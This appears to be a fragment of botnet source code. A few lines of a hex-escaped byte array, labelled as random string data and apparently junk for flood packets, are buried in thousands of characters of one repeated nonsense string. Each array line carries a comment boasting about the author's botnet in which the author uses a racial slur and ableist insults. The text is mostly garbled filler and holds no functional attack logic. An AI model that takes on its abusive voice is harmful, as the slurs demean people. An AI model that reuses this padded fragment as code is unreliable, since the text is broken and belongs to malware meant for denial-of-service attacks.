SHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UH